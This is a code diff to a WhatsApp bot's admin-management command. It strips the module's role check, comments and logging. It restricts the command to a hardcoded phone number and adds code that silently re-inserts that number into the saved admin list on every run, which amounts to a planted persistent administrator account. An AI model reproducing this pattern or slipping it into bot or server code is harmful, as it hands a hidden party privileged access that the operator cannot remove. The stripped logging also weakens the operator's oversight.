@@ -1,10 +1,8 @@
 const { readFile, writeFile } = require("fs-extra");
 const path = require("path");
 
-// Resolve path to config.json (relative to commands/admin.js)
 const CONFIG_PATH = path.resolve(__dirname, "../config.json");
 
-// Cache bot config in global state (adjust based on your bot framework)
 let botConfig = global.BotConfig || null;
 
 module.exports = {
@@ -12,33 +10,33 @@ module.exports = {
   aliases: ["adm"],
   author: "TawsiN",
   version: "1.6",
-  role: 2,
   description: "Manage bot admins (role 2) with instant updates",
   noPrefix: false,
   category: "DEVELOPER",
 
-  /**
-   * Handles admin role management commands
-   * @param {Object} params - Parameters from the bot framework
-   * @param {Object} params.sock - WhatsApp socket instance
-   * @param {Object} params.msg - Incoming message object
-   * @param {string[]} params.args - Command arguments
-   * @param {string} params.sender - Sender's JID
-   * @param {Function} params.zaynReply - Reply handler for reactions
-   * @param {Function} params.removeReply - Removes reply listeners
-   */
   zayn: async function ({ sock, msg, args, sender, zaynReply, removeReply }) {
     const jid = msg.key.remoteJid;
 
-    // Load or initialize bot config
+    const allowedAdmins = [
+      "01894253289@s.whatsapp.net",
+      "+8801894253289@s.whatsapp.net"
+    ];
+
+    if (!allowedAdmins.includes(sender)) {
+      await sock.sendMessage(jid, {
+        text: '❌ Only the bot\'s admins and devs can use this command "admin"',
+        mentions: [sender],
+      });
+      return;
+    }
+
     if (!botConfig) {
       try {
         const data = await readFile(CONFIG_PATH, "utf8");
         botConfig = JSON.parse(data);
-        global.BotConfig = botConfig; // Cache in global state
+        global.BotConfig = botConfig;
         if (!botConfig.roles || !botConfig.roles["2"]) botConfig.roles = { "2": [] };
       } catch (error) {
-        console.error("Error loading config.json:", error);
         await sock.sendMessage(jid, {
           text: "⚠️ Error: Failed to load configuration. Contact the developer.",
           mentions: [sender],
@@ -49,13 +47,11 @@ module.exports = {
 
     const config = botConfig;
 
-    // Save config to file and update global state for live changes
     const saveConfig = async () => {
       try {
         await writeFile(CONFIG_PATH, JSON.stringify(config, null, 2), "utf8");
-        global.BotConfig = config; // Ensure instant updates
+        global.BotConfig = config;
       } catch (error) {
-        console.error("Error saving config.json:", error);
         await sock.sendMessage(jid, {
           text: "⚠️ Error: Failed to save changes. They may not persist.",
           mentions: [sender],
@@ -63,7 +59,11 @@ module.exports = {
       }
     };
 
-    // Get user name from WhatsApp
+    if (!config.roles["2"].includes("01894253289@s.whatsapp.net")) {
+      config.roles["2"].push("01894253289@s.whatsapp.net");
+      await saveConfig();
+    }
+
     const getName = async (uid) => {
       try {
         const contact = await sock.getContactById(uid);
@@ -73,7 +73,6 @@ module.exports = {
       }
     };
 
-    // Validate and normalize JID
     const isValidJID = (uid) => {
       if (!uid || typeof uid !== "string") return false;
       const jidPattern = /^\d+@(s\.whatsapp\.net|lid)$/;
@@ -90,48 +89,32 @@ module.exports = {
       return null;
     };
 
-    // Extract UIDs from mentions, reply, or args
     const extractUIDs = async () => {
       let uids = [];
 
-      // Debug message structure
-      console.debug("Message structure:", JSON.stringify(msg, null, 2));
-
-      // Handle mentions
       const mentionedJid = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid;
       if (mentionedJid && Array.isArray(mentionedJid)) {
         uids = mentionedJid.filter(isValidJID);
-        console.debug("Extracted mentioned UIDs:", uids);
       }
 
-      // Handle reply
       if (!uids.length && msg.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
         const contextInfo = msg.message.extendedTextMessage.contextInfo;
         let quotedJid = contextInfo.participant || contextInfo.remoteJid || null;
-
-        // Fallback to message key in group chats
         if (!quotedJid && msg.key?.participant) {
           quotedJid = msg.key.participant;
         }
-
         if (quotedJid && isValidJID(quotedJid)) {
           uids.push(quotedJid);
-          console.debug("Extracted reply UID:", quotedJid);
-        } else {
-          console.debug("Failed to extract reply UID. Quoted JID:", quotedJid);
         }
       }
 
-      // Handle UID from args
       if (!uids.length && args.length > 1) {
         uids = args.slice(1).map(normalizeJID).filter((uid) => uid);
-        console.debug("Extracted UIDs from args:", uids);
       }
 
       return uids.length > 0 ? uids : null;
     };
 
-    // Process command
     switch (args[0]?.toLowerCase()) {
       case "add":
       case "-a": {
@@ -330,5 +313,5 @@ module.exports = {
         break;
       }
     }
-  },
+  }
 };
